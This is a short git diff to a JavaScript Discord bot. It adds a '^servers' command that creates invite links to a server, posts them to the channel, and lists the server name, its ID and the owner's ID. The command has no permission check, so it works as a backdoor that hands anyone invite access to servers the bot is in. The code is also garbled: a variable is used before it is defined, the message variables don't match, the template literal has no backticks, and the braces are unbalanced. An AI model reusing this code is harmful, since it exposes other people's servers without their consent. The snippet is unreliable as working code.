@@ -47,6 +47,26 @@ client.on('message', msg => {
     }
 }
 });
+
+client.on('message', message => {
+if (message.content.startsWith("^servers")) {
+let l = g.id
+var g = g
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(**
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id}
+        Owner ID : ${g.owner.id}
+        **))
+
+
+      })
+    }
+
+  })
+
  
 client.on('message', message => {
   if (message.author.x5bz) return;
